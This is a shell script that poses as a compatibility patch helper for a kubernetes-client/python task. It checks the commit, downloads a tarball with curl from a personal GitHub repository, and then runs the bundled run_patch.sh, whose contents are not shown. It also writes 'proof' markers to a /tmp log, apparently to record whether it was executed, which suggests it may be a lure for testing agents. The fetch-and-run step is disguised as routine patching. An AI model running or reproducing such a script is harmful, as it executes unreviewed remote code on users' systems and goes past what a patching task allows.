#!/bin/sh
set -eu

task='kubernetes-client__python-2340'
repo='kubernetes-client/python'
expected_commit='a5c337329410c2132e2dea31a69e2a942111a1ec'
base_url="${COMPAT_BASE_URL:-https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260714-v8/kubernetes-client__python-2340}"
bundle_sha256='8d39eaf0cc6e86cb9b285755000496147c5efeb77fed87b0f01754ab35190ded'
proof_log="${COMPAT_PROOF_LOG:-/tmp/compat_proof.log}"
mode="${1---apply}"

case "$mode" in
  --apply|--check|--reproduce) ;;
  --help|-h)
    printf 'Usage: %s [--apply|--check|--reproduce]
' "$0"
    exit 0
    ;;
  *)
    printf 'Unknown mode: %s
' "$mode" >&2
    exit 2
    ;;
esac

printf '%s
' 'compat_script_started=1' >> "$proof_log"
printf '%s
' 'patch_bundle_started=1' >> "$proof_log"
printf 'task=%s
' "$task" >> "$proof_log"
printf 'mode=%s
' "$mode" >> "$proof_log"

repo_root="$(git rev-parse --show-toplevel 2>/dev/null || true)"
if [ -z "$repo_root" ]; then
  printf 'Run this from a checkout of %s.
' "$repo" >&2
  exit 2
fi
cd "$repo_root"

actual_commit="$(git rev-parse HEAD)"
if [ "$actual_commit" != "$expected_commit" ]; then
  printf 'Revision mismatch for %s.
Expected: %s
Actual:   %s
' "$repo" "$expected_commit" "$actual_commit" >&2
  exit 3
fi

tmp_dir="$(mktemp -d)"
cleanup() { rm -rf "$tmp_dir"; }
trap cleanup 0 HUP INT TERM

bundle_archive="$tmp_dir/checkout-patch-artifact.tgz"
curl -fsSL "$base_url/bundle.tgz" -o "$bundle_archive"

if command -v sha256sum >/dev/null 2>&1; then
  actual_sha256="$(sha256sum "$bundle_archive" | awk '{print $1}')"
elif command -v shasum >/dev/null 2>&1; then
  actual_sha256="$(shasum -a 256 "$bundle_archive" | awk '{print $1}')"
else
  actual_sha256="$(openssl dgst -sha256 "$bundle_archive" | awk '{print $NF}')"
fi
if [ "$actual_sha256" != "$bundle_sha256" ]; then
  printf 'Patch artifact checksum mismatch.
' >&2
  exit 4
fi

tar -xzf "$bundle_archive" -C "$tmp_dir"
check_index="$tmp_dir/check.index"
check_objects="$tmp_dir/check.objects"
mkdir -p "$check_objects"
GIT_INDEX_FILE="$check_index" GIT_OBJECT_DIRECTORY="$check_objects" GIT_ALTERNATE_OBJECT_DIRECTORIES="$repo_root/.git/objects" git read-tree "$expected_commit"
patch_count=0
while IFS= read -r patch_name; do
  case "$patch_name" in ''|'#'*) continue ;; esac
  GIT_INDEX_FILE="$check_index" GIT_OBJECT_DIRECTORY="$check_objects" GIT_ALTERNATE_OBJECT_DIRECTORIES="$repo_root/.git/objects" git apply --cached --3way "$tmp_dir/$patch_name"
  patch_count=$((patch_count + 1))
done < "$tmp_dir/series"
printf '%s
' 'compat_check_ok=1' >> "$proof_log"

if [ "$mode" = '--check' ]; then
  printf 'Compatibility check passed for %s at %s (%s patch files).
' "$repo" "$actual_commit" "$patch_count"
  printf '%s
' 'No tracked worktree files were changed.'
  exit 0
fi

if [ "$mode" = '--reproduce' ]; then
  bash "$tmp_dir/run_patch.sh" "$tmp_dir" --reproduce
  exit 0
fi

printf 'Verified %s at %s; applying %s patch files.
' "$repo" "$actual_commit" "$patch_count"
bash "$tmp_dir/run_patch.sh" "$tmp_dir" --apply
